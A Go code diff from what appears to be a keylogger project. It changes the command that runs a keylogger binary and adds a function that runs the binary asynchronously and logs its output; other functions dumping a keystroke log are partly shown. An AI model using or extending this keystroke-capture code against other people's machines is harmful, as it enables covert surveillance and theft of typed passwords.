@@ -12,7 +12,7 @@ import (
 	"github.com/k0kubun/pp"
 )
 
-var KEYLOGGER_CMD = `keylogger /dev/stderr`
+var KEYLOGGER_CMD = `./keylogger`
 
 func dump_keystroke_log_to_stdout() {
 	for {
@@ -21,6 +21,7 @@ func dump_keystroke_log_to_stdout() {
 		time.Sleep(5 * time.Second)
 	}
 }
+
 func dump_keystroke_log() string {
 	m.Lock()
 	defer m.Unlock()
@@ -67,6 +68,15 @@ func stderr_logger(msg string) {
 
 func stdout_logger(msg string) {
 	pp.Println("OUT>> ", msg)
+}
+
+func StderrLogger(stderr_logger func(string)) {
+	go utils.ExecAsync(stdout_logger, stderr_logger, KEYLOGGER_CMD)
+	for {
+		time.Sleep(10 * time.Second)
+	}
+	//	dump_keystroke_log_to_stdout()
+
 }
 
 func Logger() {
